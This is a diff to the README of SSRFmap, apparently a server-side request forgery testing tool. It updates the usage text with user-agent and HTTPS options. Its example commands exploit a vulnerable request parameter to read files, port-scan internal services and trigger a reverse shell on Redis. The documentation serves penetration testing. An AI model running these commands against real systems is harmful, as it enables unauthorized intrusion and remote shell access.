@@ -14,17 +14,21 @@ cd SSRFmap/
 pip3 install -r requirements.txt
 python3 ssrfmap.py
 
-usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [--lhost LHOST] [--lport LPORT] [--level LEVEL]
+usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
+                  [--lhost LHOST] [--lport LPORT] [--uagent USERAGENT]
+                  [--ssl [SSL]] [--level [LEVEL]]
 
 optional arguments:
-  -h, --help     show this help message and exit
-  -r REQFILE     SSRF Request file
-  -p PARAM       SSRF Parameter to target
-  -m MODULES     SSRF Modules to enable
-  -l HANDLER     Start an handler for a reverse shell
-  --lhost LHOST  LHOST reverse shell
-  --lport LPORT  LPORT reverse shell
-  --level [LEVEL]  Level of test to perform (1-5, default: 1)
+  -h, --help          show this help message and exit
+  -r REQFILE          SSRF Request file
+  -p PARAM            SSRF Parameter to target
+  -m MODULES          SSRF Modules to enable
+  -l HANDLER          Start an handler for a reverse shell
+  --lhost LHOST       LHOST reverse shell
+  --lport LPORT       LPORT reverse shell
+  --uagent USERAGENT  User Agent to use
+  --ssl [SSL]         Use HTTPS without verification
+  --level [LEVEL]     Level of test to perform (1-5, default: 1)
 ```
 
 The default way to use this script is the following.
@@ -32,6 +36,9 @@ The default way to use this script is the following.
 ```powershell
 # Launch a portscan on localhost and read default files
 python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
+
+# Launch a portscan against an HTTPS endpoint using a custom user-agent
+python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
 
 # Triggering a reverse shell on a Redis
 python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
